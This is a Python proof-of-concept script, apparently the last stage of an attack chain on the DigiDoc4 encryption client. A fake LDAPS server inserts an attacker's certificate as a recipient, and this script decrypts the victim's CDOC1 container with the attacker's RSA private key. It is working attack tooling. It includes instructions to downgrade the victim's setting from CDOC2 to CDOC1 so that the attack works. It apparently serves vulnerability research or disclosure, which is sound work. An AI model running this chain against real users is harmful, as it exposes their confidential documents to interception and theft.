#!/usr/bin/env python3
"""
Decrypt a CDOC1 container produced by DigiDoc4 using the attacker's
RSA private key.

This is the final step of the H1 PoC end-to-end chain:
  1. Fake LDAPS server returns Mallory's cert as a recipient.
  2. Victim encrypts a file via DigiDoc4 → secret.cdoc.
  3. Attacker decrypts with mallory.key → plaintext recovered.

DigiDoc4 produces CDOC1 by default (CDOC2-DEFAULT setting = false).
If you switched to CDOC2 (.cdoc2 extension), this script will tell
you so and ask you to re-encrypt as CDOC1.

Usage:
  pip3 install cryptography
  ./decrypt.py --in secret.cdoc --key certs/mallory.key --out decrypted/
"""
from __future__ import annotations

import argparse
import base64
import io
import re
import sys
import zipfile
from pathlib import Path
from xml.etree import ElementTree as ET

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

NS = {
    "enc": "http://www.w3.org/2001/04/xmlenc#",
    "ds":  "http://www.w3.org/2000/09/xmldsig#",
    "ddoc": "http://www.sk.ee/DigiDoc/v1.3.0#",
}
# Bulk content ciphers. Map URI -> (key_size_bytes, mode_tag).
BULK = {
    # XML-ENC 1.0 — AES-CBC, IV is the first 16 bytes of CipherValue.
    "http://www.w3.org/2001/04/xmlenc#aes128-cbc":   (16, "cbc"),
    "http://www.w3.org/2001/04/xmlenc#aes192-cbc":   (24, "cbc"),
    "http://www.w3.org/2001/04/xmlenc#aes256-cbc":   (32, "cbc"),
    # XML-ENC 1.1 — AES-GCM, layout = nonce(12) || ciphertext || tag(16).
    "http://www.w3.org/2009/xmlenc11#aes128-gcm":    (16, "gcm"),
    "http://www.w3.org/2009/xmlenc11#aes192-gcm":    (24, "gcm"),
    "http://www.w3.org/2009/xmlenc11#aes256-gcm":    (32, "gcm"),
}
ALG = {
    "rsa15":   "http://www.w3.org/2001/04/xmlenc#rsa-1_5",
    "rsaoaep": "http://www.w3.org/2001/04/xmlenc#rsa-oaep-mgf1p",
}


def b64(s: str) -> bytes:
    return base64.b64decode(re.sub(r"\s+", "", s or ""))


def unpad_pkcs7(buf: bytes) -> bytes:
    if not buf:
        return buf
    pad = buf[-1]
    if pad < 1 or pad > 16 or any(b != pad for b in buf[-pad:]):
        # Not a valid PKCS#7 padding — return as-is rather than error
        # (some CDOC variants don't pad cleanly)
        return buf
    return buf[:-pad]


def detect_cdoc2(path: Path) -> bool:
    """CDOC2 starts with the magic 'CDOC\\x02'."""
    with path.open("rb") as f:
        head = f.read(8)
    return head.startswith(b"CDOC\x02")


def rsa_decrypt(private_key, ciphertext: bytes, algorithm: str) -> bytes | None:
    """Try the indicated RSA padding; return None on failure."""
    try:
        if algorithm == ALG["rsa15"]:
            return private_key.decrypt(ciphertext, padding.PKCS1v15())
        if algorithm == ALG["rsaoaep"]:
            return private_key.decrypt(
                ciphertext,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA1()),
                    algorithm=hashes.SHA1(),
                    label=None,
                ),
            )
    except Exception:
        return None
    return None


def extract_ddoc(plaintext: bytes, out_dir: Path) -> int:
    """If plaintext is a DDOC XML, extract <DataFile> entries; return count."""
    try:
        root = ET.fromstring(plaintext)
    except ET.ParseError:
        return 0
    count = 0
    for df in root.iter():
        # Match {ns}DataFile or plain DataFile
        if not (df.tag.endswith("}DataFile") or df.tag == "DataFile"):
            continue
        name = df.get("Filename") or df.get("filename") or f"file_{count}.bin"
        content_b64 = df.text or ""
        try:
            content = b64(content_b64)
        except Exception:
            continue
        target = out_dir / Path(name).name
        target.write_bytes(content)
        print(f"[+] Extracted (DDOC): {target}  ({len(content)} bytes)")
        count += 1
    return count


def decrypt_cdoc1(cdoc_path: Path, key_path: Path, out_dir: Path) -> None:
    private_key = serialization.load_pem_private_key(
        key_path.read_bytes(), password=None
    )

    tree = ET.parse(cdoc_path)
    root = tree.getroot()
    if root.tag != f"{{{NS['enc']}}}EncryptedData":
        sys.exit(f"[!] Not a CDOC1 container (root element: {root.tag})")

    # Identify bulk algorithm
    em = root.find("enc:EncryptionMethod", NS)
    bulk_alg = em.get("Algorithm") if em is not None else None
    if bulk_alg not in BULK:
        sys.exit(f"[!] Unsupported bulk algorithm: {bulk_alg}")
    key_size, mode = BULK[bulk_alg]
    print(f"[+] Bulk cipher: AES-{key_size*8}-{mode.upper()}")

    # Locate first decryptable EncryptedKey
    cek = None
    n_locks = 0
    for ek in root.iter(f"{{{NS['enc']}}}EncryptedKey"):
        n_locks += 1
        ekm = ek.find("enc:EncryptionMethod", NS)
        if ekm is None:
            continue
        ka = ekm.get("Algorithm")
        cv_node = ek.find("enc:CipherData/enc:CipherValue", NS)
        if cv_node is None:
            continue
        ct = b64(cv_node.text)
        candidate = rsa_decrypt(private_key, ct, ka)
        if candidate and len(candidate) == key_size:
            cek = candidate
            print(f"[+] Decrypted CEK from lock #{n_locks} ({ka.rsplit('#',1)[1]})")
            break

    print(f"[i] Locks in container: {n_locks}")
    if cek is None:
        sys.exit("[!] Could not decrypt any EncryptedKey with the provided "
                 "private key. Wrong key or not a recipient.")

    # Decrypt bulk content
    cv_node = root.find("enc:CipherData/enc:CipherValue", NS)
    if cv_node is None:
        sys.exit("[!] Missing CipherData/CipherValue in EncryptedData")
    encdata = b64(cv_node.text)

    if mode == "cbc":
        iv, ct = encdata[:16], encdata[16:]
        decryptor = Cipher(algorithms.AES(cek), modes.CBC(iv)).decryptor()
        plaintext = unpad_pkcs7(decryptor.update(ct) + decryptor.finalize())
    elif mode == "gcm":
        # XML-ENC 1.1: first 12 bytes = nonce; last 16 bytes = auth tag.
        nonce, ct_with_tag = encdata[:12], encdata[12:]
        try:
            plaintext = AESGCM(cek).decrypt(nonce, ct_with_tag, None)
        except Exception as e:
            sys.exit(f"[!] GCM authentication failed: {e}")
    else:
        sys.exit(f"[!] Internal: unknown mode {mode!r}")

    out_dir.mkdir(parents=True, exist_ok=True)
    mime = root.get("MimeType", "")
    print(f"[+] Container MIME: {mime!r}")

    # Try DDOC unwrap (multiple files)
    extracted = extract_ddoc(plaintext, out_dir)
    if extracted:
        return

    # Try ZIP (some CDOC1 variants wrap content in zip)
    try:
        with zipfile.ZipFile(io.BytesIO(plaintext)) as zf:
            for name in zf.namelist():
                target = out_dir / Path(name).name
                target.write_bytes(zf.read(name))
                print(f"[+] Extracted (ZIP): {target}")
            return
    except (zipfile.BadZipFile, KeyError):
        pass

    # Single-file mode (ENCDOC-XML|1.1)
    orig = None
    for prop in root.iter(f"{{{NS['enc']}}}EncryptionProperty"):
        if prop.get("Name") in ("Filename", "orig_file"):
            value = (prop.text or "").strip()
            orig = value.split("|", 1)[0] if "|" in value else value
            break
    target = out_dir / (Path(orig).name if orig else "decrypted.bin")
    target.write_bytes(plaintext)
    print(f"[+] Recovered: {target}  ({len(plaintext)} bytes)")


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n", 1)[0])
    ap.add_argument("--in", dest="input", required=True, type=Path,
                    help="path to encrypted .cdoc file")
    ap.add_argument("--key", required=True, type=Path,
                    help="attacker's RSA private key (PEM)")
    ap.add_argument("--out", default=Path("decrypted"), type=Path,
                    help="output directory (default: ./decrypted)")
    args = ap.parse_args()

    if not args.input.exists():
        sys.exit(f"[!] Input file not found: {args.input}")
    if not args.key.exists():
        sys.exit(f"[!] Key file not found: {args.key}")

    if detect_cdoc2(args.input):
        sys.exit(
            f"[!] {args.input.name} is a CDOC2 container.\n"
            f"    This script handles only CDOC1.\n"
            f"    Re-encrypt with CDOC1 in DigiDoc4:\n"
            f"      Settings -> General -> uncheck 'Use CDOC2 format by default'\n"
            f"    Then encrypt again — file should end in .cdoc, not .cdoc2."
        )

    decrypt_cdoc1(args.input, args.key, args.out)


if __name__ == "__main__":
    main()
